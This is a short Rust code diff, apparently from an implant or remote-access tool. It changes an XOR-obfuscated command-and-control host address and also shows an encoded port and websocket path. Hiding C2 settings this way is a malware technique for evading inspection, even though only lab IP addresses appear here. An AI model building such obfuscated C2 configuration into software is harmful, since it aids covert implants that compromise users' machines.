@@ -25,7 +25,7 @@ fn xd(encoded: &[u8]) -> String {
 }
 
 // C2
-const ENC_C2_HOST: [u8; 15] = xor_encode(b"192.168.0.107  ");
+const ENC_C2_HOST: [u8; 15] = xor_encode(b"192.168.0.108  ");
 const ENC_C2_PORT: [u8; 4] = xor_encode(b"4443");
 const ENC_WSS_PATH: [u8; 4] = xor_encode(b"/ws ");
 
